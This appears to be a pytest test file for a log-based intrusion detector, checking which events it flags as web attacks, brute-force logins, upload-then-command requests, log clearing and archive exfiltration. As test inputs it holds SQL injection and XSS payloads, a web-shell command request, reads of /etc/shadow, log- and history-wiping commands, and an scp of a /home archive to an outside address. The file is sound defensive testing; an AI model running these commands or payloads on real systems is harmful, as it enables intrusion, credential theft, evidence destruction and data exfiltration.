from datetime import datetime,timedelta,timezone
import pytest
from analyzer.detector import detect
from analyzer.parser import parse_line

def event(i,action='login',status='failed',user='admin',ip='192.0.2.8',host='h',**extra):
    return dict(timestamp=(datetime(2026,10,9,tzinfo=timezone.utc)+timedelta(seconds=i)).isoformat(),line=i+1,action=action,status=status,user=user,ip=ip,host=host,country='UNKNOWN',**extra)
def kinds(events):return {f['type'] for f in detect(events)}
@pytest.mark.parametrize('payload',["/x?id=1%20UNION%2FSELECT%20password%20FROM%20users",'/x?q=%3Cimg%20src=x%20onerror=alert(1)%3E',"/x?q=1'/**/OR/**/1=1--",'/x?q=%253Cscript%253Ealert(1)'])
def test_obfuscated_web(payload):
    assert 'web_attack' in kinds([event(0,'GET','success',request='GET '+payload+' HTTP/1.1')])
@pytest.mark.parametrize('web_request',['GET /static/script.js HTTP/1.1','GET /search?q=union%20membership HTTP/1.1','GET /docs?topic=onerror HTTP/1.1'])
def test_benign_web(web_request):assert 'web_attack' not in kinds([event(0,'GET','success',request=web_request)])
def test_distributed_and_host_isolation():
    events=[event(i,user='u'+str(i%2),ip='192.0.2.'+str(i//2+1)) for i in range(12)]
    assert 'distributed_authentication' in kinds(events)
    for i,e in enumerate(events):e['host']='h'+str(i%2)
    assert 'distributed_authentication' not in kinds(events)
def test_slow_source_then_success():
    events=[event(i*600,user='u'+str(i)) for i in range(8)]
    events.append(event(4800,status='success',user='admin'))
    assert {'slow_authentication','success_after_source_failures'}<=kinds(events)
def test_success_resets_slow_context():
    events=[event(i*600,user='u'+str(i)) for i in range(7)]
    events += [event(4200,status='success'),event(4300),event(4400,status='success')]
    assert 'success_after_source_failures' not in kinds(events)
def test_upload_sequence_and_host_boundary():
    a=event(0,'POST','success',request='POST /upload HTTP/1.1',http_status=201)
    b=event(60,'GET','success',request='GET /uploads/a.php?cmd=whoami HTTP/1.1',http_status=200)
    assert 'upload_command_request' in kinds([a,b])
    b['host']='different';assert 'upload_command_request' not in kinds([a,b])
def test_failed_upload_not_correlated():
    events=[event(0,'POST','failed',request='POST /upload HTTP/1.1',http_status=403),event(2,'GET','success',request='GET /uploads/a.php?cmd=id HTTP/1.1')]
    assert 'upload_command_request' not in kinds(events)
@pytest.mark.parametrize('command',['/usr/bin/ls -la /etc/shadow','stat /etc/shadow','useradd employee','crontab -e','rm /tmp/old-backup.tgz','journalctl --vacuum-time=7d'])
def test_admin_controls(command):assert not kinds([event(0,'privilege','alert',ip='UNKNOWN',command=command)])
@pytest.mark.parametrize('command,kind',[('cat /etc/shadow','sensitive_file_read'),('cp /etc/shadow /tmp/s','sensitive_file_read'),('history -c','history_clearing'),('rm -f /var/log/auth.log.1','log_clearing'),('journalctl --vacuum-time=1s','log_clearing')])
def test_command_review(command,kind):assert kind in kinds([event(0,'privilege','alert',ip='UNKNOWN',command=command)])
def test_archive_transfer_controls():
    a=event(0,'privilege','alert',command='tar -czf /tmp/a.tgz /home')
    b=event(5,'privilege','alert',command='scp /tmp/a.tgz user@203.0.113.250:/tmp/')
    assert 'archive_transfer_review' in kinds([a,b])
    b['command']='scp /tmp/a.tgz user@10.0.2.50:/tmp/'
    assert 'archive_transfer_review' not in kinds([a,b])
    b['command']='scp /tmp/different.tgz user@203.0.113.250:/tmp/'
    assert 'archive_transfer_review' not in kinds([a,b])
    a['command']='tar -xzf /tmp/a.tgz';b['command']='scp /tmp/a.tgz user@203.0.113.250:/tmp/'
    assert 'archive_transfer_review' not in kinds([a,b])
def test_http_status_evidence():
    e=parse_line('Oct 09 01:00:00 h nginx: 192.0.2.5 - - [09/Oct/2026:01:00:00 +0000] "POST /upload HTTP/1.1" 404 0',1)
    assert e['http_status']==404 and e['status']=='failed'
def test_malformed_url_is_safe():detect([event(0,'GET','success',request='GET http://[broken HTTP/1.1')])

def test_owner_approved_external_backup(monkeypatch):
    import config
    monkeypatch.setattr(config,'TRUSTED_TRANSFER_NETWORKS',('203.0.113.250/32',))
    events=[event(0,'privilege','alert',command='tar -czf /tmp/a.tgz /home'),event(1,'privilege','alert',command='scp /tmp/a.tgz u@203.0.113.250:/tmp/')]
    assert 'archive_transfer_review' not in kinds(events)

def test_suspicious_account_and_cron_context():
    events=[event(i) for i in range(3)]+[event(4,status='success')]
    events+=[event(5,'privilege','alert',command='useradd service'),event(6,'privilege','alert',command='crontab -e')]
    findings=detect(events)
    assert {'account_creation_context','cron_change_context'}<={f['type'] for f in findings}
    assert len(next(f for f in findings if f['type']=='account_creation_context')['evidence_lines'])==5

def test_no_cross_host_account_context():
    events=[event(i) for i in range(3)]+[event(4,status='success'),event(5,'privilege','alert',host='other',command='useradd service')]
    assert 'account_creation_context' not in kinds(events)

def test_quoted_history_prose_is_quiet():
    assert not kinds([event(0,'privilege','alert',command='echo history -c')])
